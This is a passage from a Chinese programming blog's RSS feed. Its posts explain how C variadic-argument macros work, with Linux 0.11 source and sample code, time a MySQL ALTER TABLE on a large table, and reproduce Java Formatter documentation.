&nbsp; p+= sizeof(double);//参数二的结尾<br>&nbsp; double *p2 = (double*)&nbsp; (p - sizeof(double);<br>&nbsp; p+=sizeof(int);//参数三的结尾<br>&nbsp; int *p3 = (int*) (p-sizeof(int);<br>
}<br>这样就可以猜测va_list va_start va_arg va_end的实现<br>va_list&nbsp; 声明一个指针变量，跟踪当前参数的指针；<br>va_start 初始化这个指针的位置，最开始指向第一个参数的结尾的位置<br>va_arg 则移动指针，指向一个新参数的位置，并返回当前值<br>void func(int param1, double param2, int param3){<br>&nbsp; va_list p;<br>&nbsp; va_start(p, param1);<br>&nbsp; double p2 = va_arg(double);<br>&nbsp; double p3 = va_arg(int);<br>}<br>再和方法二的实现进行对照<br>可以预测<br>va_list &lt;-&gt; char *<br>va_start &lt;-&gt; p=&amp;beginparam<br>va_arg &lt;-&gt; x=*p, p+=sizeof(x)<br>va_end做了什么？<br><b>Linux的实现方法<br></b>查看Linux0.11的内核源代码，对va_list, va_start, va_arg 的实现如下：<br>1. va_list的实现没有差别，char*<br>typedef char *va_list;<br>2. va_start的实现<br>#define va_start(AP, LASTARG)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \ <br>&nbsp;(__builtin_saveregs (),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \ <br>&nbsp; AP = ((char *) &amp;(LASTARG) + __va_rounded_size (LASTARG))) <br>注：__builtin_saveregs()是gcc内置的函数，用来保存堆栈，其实好像也没什么必要这么做<br>然后将AP指向可变参数前一个参数的的结尾。这里的LASTARG就是前面的param1<br><br>3. va_arg的实现<br>#define va_arg(AP, TYPE)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \ <br>&nbsp;(AP += __va_rounded_size (TYPE),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \ <br>&nbsp; *((TYPE *) (AP - __va_rounded_size (TYPE)))) <br>注：这里的逻辑有点奇怪，先将指针移动到该参数的结尾，再返回指针减去该参数长度的位置内容。<br>其实这是对C语言的 , 操作符的利用。,后面的值才是返回值，所以移动指针的操作必须在前。一个很好的小技巧<br><br>4. 辅助函数<br>
#define __va_rounded_size(TYPE)&nbsp; \ <br>
&nbsp; (((sizeof (TYPE) + sizeof (int) - 1) / sizeof (int)) * sizeof (int))<br>注：前面的va_start和va_arg 都没有使用 sizeof，而是用的 va_rounded_size，这个是什么意思呢？其实和结构的成员对齐相似，每个参数最少占用4个字节。<br>例如一个char型的参数，也要占用4个字节，4个连续的char型参数，就要占用16个字节。<br>所以这里使用用 [x+ (n-1)] / n * n 的对齐公式来实现最少对齐。<br>如果要取一个char型参数，要用va_arg(args, int), 而不能用va_arg(args, char)，否则会产生编译警告，运行异常。<br><br><b>示例代码：</b><br>#include &lt;stdio.h&gt;<br>#include &lt;stdarg.h&gt;<br><br>void f(int flag,...){<br>&nbsp;&nbsp;&nbsp; va_list args;<br>&nbsp;&nbsp;&nbsp; va_start(args, flag);<br>&nbsp;&nbsp;&nbsp; int n = va_arg(args, int);<br>&nbsp;&nbsp;&nbsp; printf("%d\n", n);<br>&nbsp;&nbsp;&nbsp; double d = va_arg(args, double);<br>&nbsp;&nbsp;&nbsp; printf("%f\n", d);<br>&nbsp;&nbsp;&nbsp; char c = va_arg(args, int);<br>&nbsp;&nbsp;&nbsp; printf("%c\n",c);<br>&nbsp;&nbsp;&nbsp; int x = va_arg(args,int);<br>&nbsp;&nbsp;&nbsp; printf("%d\n",x);<br>&nbsp;&nbsp;&nbsp; va_end(args);<br>}<br>void g(int flag,...){<br>&nbsp;&nbsp;&nbsp; char *args;<br>&nbsp;&nbsp;&nbsp; args = (char*)&amp;flag+sizeof(flag);<br>&nbsp;&nbsp;&nbsp; int n = * (int *)args;<br>&nbsp;&nbsp;&nbsp; args+=sizeof(int);<br>&nbsp;&nbsp;&nbsp; printf("%d\n",n);<br>&nbsp;&nbsp;&nbsp; double d = *(double *)args;<br>&nbsp;&nbsp;&nbsp; args+=sizeof(double);<br>&nbsp;&nbsp;&nbsp; printf("%f\n",d);<br>&nbsp;&nbsp;&nbsp; char c = *(char*)args;<br>&nbsp;&nbsp;&nbsp; args+=sizeof(int);<br>&nbsp;&nbsp;&nbsp; int x = *(int*)args;<br>&nbsp;&nbsp;&nbsp; args+=sizeof(int);<br>&nbsp;&nbsp;&nbsp; printf("%d\n",x);<br>}<br>//error: there must be a arg before ...<br>
//void x(...){} <br>int main(){<br>&nbsp;&nbsp;&nbsp; f(2,8,2.5,'c',123456789);<br>&nbsp;&nbsp;&nbsp; g(2,8,2.5,'c',123456789);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201092185836599/</guid>
    </item>
    <item>
      <title>
<![CDATA[仔细看mysql修改表结构]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010524612969/</link>
      <description>
<![CDATA[一个数据库，有两个表user和friend，user表的id字段用的varchar(20)类型，其实数据是int型的，所以使用<br>alter table user modify column id int;<br>然后就开始漫长的等待，闲极无聊就去看看mysql的目录，结果发现了这样的内容，<br>应该是新建了一个表，然后完全复制过去！<br>101487条记录耗时17.64秒，10563409条记录耗时1小时22分20.46秒<br><br>-rw-rw---- 1 mysql mysql&nbsp;&nbsp; 61 2010-06-11 16:43 db.opt<br>-rw-rw---- 1 mysql mysql&nbsp; 69K 2010-06-24 16:29 friend.frm<br>-rw-rw---- 1 mysql mysql 210M 2010-06-24 16:30 friend.MYD<br>-rw-rw---- 1 mysql mysql 1.2M 2010-06-24 16:30 friend.MYI<br>-rw-rw---- 1 mysql mysql 8.5K 2010-06-24 16:31 #sql-6c84_8b.frm<br>-rw-rw---- 1 mysql mysql 944M 2010-06-24 16:58 #sql-6c84_8b.MYD<br>-rw-rw---- 1 mysql mysql&nbsp; 94M 2010-06-24 16:58 #sql-6c84_8b.MYI<br>-rw-rw---- 1 mysql mysql 8.5K 2010-06-11 16:44 user.frm<br>-rw-rw---- 1 mysql mysql 1.3G 2010-06-24 16:04 user.MYD<br>-rw-rw---- 1 mysql mysql 134M 2010-06-24 16:31 user.MYI]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010524612969/</guid>
    </item>
    <item>
      <title>
<![CDATA[System.out.printf(String format, String ...args)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720076128375340/</link>
      <description>
<![CDATA[<A rel="nofollow" >&nbsp;   <H4>常规 </H4></A>  <P>以下常规转换可应用于任何参数类型：   <TABLE cellPadding="5" summary="dgConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'b'</TT>   </TD><TD vAlign="top" ><TT>'\b'</TT>   </TD><TD>将生成 "<TT>true</TT>" 或 "<TT>false</TT>"，由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Boolean.html#toString(boolean)"  ><CODE>Boolean.toString(boolean)</CODE></A> 返回。   <P>如果参数为 <TT>null</TT>，则结果为 "<TT>false</TT>"。如果参数是一个 <TT>boolean</TT> 值或 <A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Boolean.html"  ><CODE>Boolean</CODE></A>，那么结果是由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/String.html#valueOf(boolean)"  ><CODE>String.valueOf()</CODE></A> 返回的字符串。否则结果为 "<TT>true</TT>"。   </P><P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'B'</TT>   </TD><TD vAlign="top" ><TT>'\B'</TT>   </TD><TD><TT>'b'</TT> 的大写形式。   </TD><TR>  <TD vAlign="top" ><TT>'h'</TT>   </TD><TD vAlign="top" ><TT>'\h'</TT>   </TD><TD>生成一个表示对象的哈希码值的字符串。   <P>如果参数 <I>arg</I> 为 <TT>null</TT>，则结果为 "<TT>null</TT>"。否则，结果为调用 <TT>Integer.toHexString(arg.hashCode())</TT> 得到的结果。   </P><P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'H'</TT>   </TD><TD vAlign="top" ><TT>'\H'</TT>   </TD><TD><TT>'h'</TT> 的大写形式。   </TD><TR>  <TD vAlign="top" ><TT>'s'</TT>   </TD><TD vAlign="top" ><TT>'\s'</TT>   </TD><TD>生成一个字符串。   <P>如果参数为 <TT>null</TT>，则结果为 "<TT>null</TT>"。如果参数实现了 <A title="java.util &#20013;&#30340;&#25509;&#21475;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formattable.html"  ><CODE>Formattable</CODE></A>，则调用其 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formattable.html#formatTo(java.util.Formatter, int, int, int)"  ><CODE>formatTo</CODE></A> 方法。否则，结果为调用参数的 <TT>toString()</TT> 方法得到的结果。   </P><P>如果给出 <TT>'#'</TT> 标志，且参数不是 <A title="java.util &#20013;&#30340;&#25509;&#21475;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formattable.html"  ><CODE>Formattable</CODE></A>，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'S'</TT>   </TD><TD vAlign="top" ><TT>'\S'</TT>   </TD><TD><TT>'s'</TT> 的大写形式。 </TD></TR></TR></TR></TR></TR></TR></TABLE>  </P><P>以下标志应用于常规转换： <A rel="nofollow" >  <TABLE cellPadding="5" summary="dFlags" ></TABLE></A>  <TBODY>  <TR>  <TD vAlign="top" ><TT>'-'</TT>   </TD><TD vAlign="top" ><TT>'\-'</TT>   </TD><TD>将输出左对齐。根据需要在转换值结尾处添加空格 (<TT>'\ '</TT>)，以满足字段的最小宽度要求。如果没有提供宽度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/MissingFormatWidthException.html"  ><CODE>MissingFormatWidthException</CODE></A>。如果没有给出此标志，则输出将是右对齐的。   </TD><TR>  <TD vAlign="top" ><TT>'#'</TT>   </TD><TD vAlign="top" ><TT>'\#'</TT>   </TD><TD>要求输出使用替换形式。此形式的定义通过转换指定。 </TD></TR></TR><A rel="nofollow" ></A>  </P><P>宽度是将向输出中写入的最少字符数。如果转换值的长度小于宽度，则用 <TT>'&nbsp;&nbsp;'</TT> (<TT>\ '</TT>) 填充输出，直到字符总数等于宽度为止。默认情况下，是在左边进行填充。如果给出 <TT>'-'</TT> 标志，则在右边进行填充。如果没有指定宽度，则没有最小宽度。   </P><P>精度是将向输出中写入的最多字符数。精度的应用要先于宽度，因此，即使宽度大于精度，输出也将被截取为 <TT>precision</TT> 字符。如果没有指定精度，则对字符数没有明确限制。 <A rel="nofollow" >  <H4>字符 </H4></A>此转换可应用于 <TT>char</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Character.html"  ><CODE>Character</CODE></A>、<TT>byte</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Byte.html"  ><CODE>Byte</CODE></A>、<TT>short</TT> 和 <A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Short.html"  ><CODE>Short</CODE></A>。当 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Character.html#isValidCodePoint(int)"  ><CODE>Character.isValidCodePoint(int)</CODE></A> 返回 <TT>true</TT> 时，此转换也可应用于 <TT>int</TT> 和 <A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Integer.html"  ><CODE>Integer</CODE></A>。如果返回 <TT>false</TT>，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatCodePointException.html"  ><CODE>IllegalFormatCodePointException</CODE></A>。   <TABLE cellPadding="5" summary="charConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'c'</TT>   </TD><TD vAlign="top" ><TT>'\c'</TT>   </TD><TD>将参数格式化为《<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Character.html#unicode"  >Unicode Character Representation</A>》中描述的 Unicode 字符。在该参数表示增补字符的情况下，它可能是多个 16 位 <TT>char</TT>。   <P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'C'</TT>   </TD><TD vAlign="top" ><TT>'\C'</TT>   </TD><TD><TT>'c'</TT> 的大写形式。 </TD></TR></TR></TABLE>  </P><P><TT>'-'</TT> 标志是为应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dFlags"  >常规转换</A>而定义的。如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。   </P><P>宽度是为了实现<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#genWidth"  >常规转换</A>而定义的。   </P><P>精度不适用。如果指定精度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatPrecisionException.html"  ><CODE>IllegalFormatPrecisionException</CODE></A>。 <A rel="nofollow" >  <H4>数值 </H4></A>  </P><P>数值转换分为以下几类：   </P><OL>  <LI><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dnint"  ><B>Byte、Short、Integer 和 Long</B></A>   </LI><LI><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dnbint"  ><B>BigInteger</B></A>   </LI><LI><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dndec"  ><B>Float 和 Double</B></A>   </LI><LI><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#dndec"  ><B>BigDecimal</B></A> </LI></OL>  <P>将根据以下算法对数值类型进行格式化：   </P><P><B><A rel="nofollow" algorithm>数字本地化算法</A><A rel="nofollow"></A></B>   </P><P>在获得数字的整数部分、小数部分和指数（适用于数据类型）之后，将应用以下转换：   </P><OL>  <LI>将字符串中的每个数字字符 <I>d</I> 都替换为特定于语言环境的数字，该数字是相对于当前语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormatSymbols.html#getZeroDigit()"  >零数字</A> <I>z</I> 来计算的；即 <I>d&nbsp;-&nbsp;</I> <TT>'0'</TT> <I>&nbsp;+&nbsp;z</I>。   </LI><LI>如果存在小数点分隔符，则用特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormatSymbols.html#getDecimalSeparator()"  >小数点分隔符</A>替换。   </LI><LI><A rel="nofollow" group></A>如果给出 <TT>','</TT> (<TT>'\,'</TT>) 标志，则插入特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormatSymbols.html#getGroupingSeparator()"  >组分隔符</A>，这是通过从最低位到最高位浏览字符串的整数部分并不时插入该语言环境<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormat.html#getGroupingSize()"  >组大小</A>定义的分隔符来实现的。   </LI><LI>如果给出 <TT>'0'</TT> 标志，则在符号字符（如果有的话）之后、第一个非零数字前插入特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormatSymbols.html#getZeroDigit()"  >零数字</A>，直到字符串长度等于所要求的字段宽度。   </LI><LI>如果该值为负，并且给出了 <TT>'('</TT> 标志，那么预先考虑 <TT>'('</TT> (<TT>'\('</TT>)，并追加一个 <TT>')'</TT> (<TT>'\)'</TT>)。   </LI><LI>如果该值为负（或者为浮点负零），并且没有给出 <TT>'('</TT> 标志，那么预先考虑 <TT>'-'</TT> (<TT>'\-'</TT>)。   </LI><LI>如果给出 <TT>'+'</TT> 标志，并且该值为正或零（或者为浮点正零），那么将预先考虑 <TT>'+'</TT> (<TT>'\+'</TT>)。 </LI></OL>  <P>如果该值为 NaN 或正无穷大，则分别输出文本字符串 "NaN" 或 "Infinity"。如果该值为负无穷大，那么输出将是 "(Infinity)"；否则如果给出 <TT>'('</TT> 标志，那么输出将是 "-Infinity"。这些值都没有被本地化。   </P><P><A rel="nofollow" ><B>Byte、Short、Integer 和 Long </B></A>  </P><P>以下转换可应用于 <TT>byte</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Byte.html"  ><CODE>Byte</CODE></A>、<TT>short</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Short.html"  ><CODE>Short</CODE></A>、<TT>int</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Integer.html"  ><CODE>Integer</CODE></A>、<TT>long</TT> 和 <A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Long.html"  ><CODE>Long</CODE></A>。   <TABLE cellPadding="5" summary="IntConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'d'</TT>   </TD><TD vAlign="top" ><TT>'\T'</TT>   </TD><TD>将参数格式化为十进制整数。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>如果给出 <TT>'0'</TT> 标志，并且值为负，则在符号后填充零。   </P><P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'o'</TT>   </TD><TD vAlign="top" ><TT>'\o'</TT>   </TD><TD>将参数格式化为以 8 为基数的整数。不应用本地化。   <P>如果 <I>x</I> 为负，那么结果将是通过将 2<SUP>n</SUP> 添加到值中产生的一个无符号值，其中 <TT>n</TT> 是在适当时候由类 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Byte.html#SIZE"  >Byte</A>、<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Short.html#SIZE"  >Short</A>、<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Integer.html#SIZE"  >Integer</A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Long.html#SIZE"  >Long</A> 中的静态 <TT>SIZE</TT> 字段返回的类型中的位数。   </P><P>如果给出 <TT>'#'</TT> 标志，则输出将始终以基数指示符 <TT>'0'</TT> 开始。   </P><P>如果给出 <TT>'0'</TT> 标志，则使用前导零填充输出，这些零被填充到以下任意指示符号后面的字段宽度中。   </P><P>如果给出 <TT>'('</TT>、<TT>'+'</TT>、'&nbsp;&nbsp;' 或 <TT>'、'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'x'</TT>   </TD><TD vAlign="top" ><TT>'\x'</TT>   </TD><TD>将参数格式化为以 16 为基数的整数。不应用本地化。   <P>如果 <I>x</I> 为负，那么结果将为把 2<SUP>n</SUP> 添加到值中产生的一个无符号值，其中 <TT>n</TT> 是在适当时候，由类 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Byte.html#SIZE"  >Byte</A>、<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Short.html#SIZE"  >Short</A>、<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Integer.html#SIZE"  >Integer</A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Long.html#SIZE"  >Long</A> 中的静态 <TT>SIZE</TT> 字段返回的类型中的位数。   </P><P>如果给出 <TT>'#'</TT> 标志，则输出将始终以基数指示符 <TT>'0x'</TT> 开始。   </P><P>如果给出 <TT>'0'</TT> 标志，则使用前导零填充输出，这些零被填充到基数指示符或符号（如果存在）后面的字段宽度中。   </P><P>如果给出 <TT>'('</TT>、<TT>'&nbsp;&nbsp;'</TT>、<TT>'+'</TT> 或 <TT>'、'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'X'</TT>   </TD><TD vAlign="top" ><TT>'\X'</TT>   </TD><TD><TT>'x'</TT> 的大写形式。将表示数字的整个字符串转换为<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/String.html#toUpperCase(java.util.Locale)"  >大写</A>，其中包括 <TT>'x'</TT> （如果有的话） 和所有十六进制数字 <TT>'a'</TT> - <TT>'f'</TT> (<TT>'\a'</TT> - <TT>'\f'</TT>)。 </TD></TR></TR></TR></TR></TABLE>  </P><P>如果该转换是 <TT>'o'</TT>、<TT>'x'</TT> 或 <TT>'X'</TT> 转换，并且给出了 <TT>'#'</TT> 和 <TT>'0'</TT> 标志，那么结果将包含基数指示符（对于八进制是 <TT>'0'</TT>，对于十六进制是 <TT>'0'</TT> 或 <TT>"0x"</TT>）、一定数量的零（基于宽度）和该值。   </P><P>如果没有给出 <TT>'-'</TT> 标志，则在符号前填充空格。   </P><P>以下标志应用于数值整数转换：   <TABLE cellPadding="5" summary="intFlags" ><A rel="nofollow" ></A>  <TBODY>  <TR>  <TD vAlign="top" ><TT>'+'</TT>   </TD><TD vAlign="top" ><TT>'\+'</TT>   </TD><TD>要求所有正数的输出都包含一个正号。如果没有给出此标志，则只有负值包含符号。   <P>如果同时给出了 <TT>'+'</TT> 和 <TT>'&nbsp;&nbsp;'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatFlagsException.html"  ><CODE>IllegalFormatFlagsException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'&nbsp;&nbsp;'</TT>   </TD><TD vAlign="top" ><TT>'\ '</TT>   </TD><TD>对于非负值的输出，要求包括单个额外空格 (<TT>'\ '</TT>)。   <P>如果同时给出了 <TT>'+'</TT> 和 <TT>'&nbsp;&nbsp;'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatFlagsException.html"  ><CODE>IllegalFormatFlagsException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'0'</TT>   </TD><TD vAlign="top" ><TT>'\0'</TT>   </TD><TD>要求将前导<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormatSymbols.html#getZeroDigit()"  >零</A>填充到输出中，这些零被填充到以下任意符号或基数指示符之后，以达到最小字段宽度，转换 NaN 或无穷大时除外。如果没有提供宽度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/MissingFormatWidthException.html"  ><CODE>MissingFormatWidthException</CODE></A>。   <P>如果同时给出 <TT>'-'</TT> 和 <TT>'0'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatFlagsException.html"  ><CODE>IllegalFormatFlagsException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>','</TT>   </TD><TD vAlign="top" ><TT>'\,'</TT>   </TD><TD>要求输出包括在本地化算法的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n group"  >“群”一节</A>中描述的特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DecimalFormatSymbols.html#getGroupingSeparator()"  >组分隔符</A>。   </TD><TR>  <TD vAlign="top" ><TT>'('</TT>   </TD><TD vAlign="top" ><TT>'\('</TT>   </TD><TD>要求输出预先考虑 <TT>'('</TT> (<TT>'\('</TT>)，并将 <TT>')'</TT> (<TT>'\)'</TT>) 追加到负值中。 </TD></TR></TR></TR></TR></TR></TABLE><A rel="nofollow" ></A>  </P><P>如果没有给出标志，则默认格式设置如下：   </P><UL>  <LI><TT>width</TT> 中的输出是右对齐的   </LI><LI>负数以 <TT>'-'</TT> (<TT>'\-'</TT>) 开始   </LI><LI>正数和零不包括符号或额外的前导空格   </LI><LI>不包括组分隔符 </LI></UL><A rel="nofollow" ></A>  <P>宽度是将向输出中写入的最少字符数。这包括所有符号、数字、组分隔符、基数指示符和圆括号。如果转换值的长度小于宽度，则用空格(<TT>'\ '</TT>) 填充输出，直到字符总数等于宽度。默认情况下，在左边进行填补。如果给出 <TT>'-'</TT> 标志，则在右边进行填补。如果没有指定宽度，则没有最小宽度。   </P><P>精度不适用。如果指定精度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatPrecisionException.html"  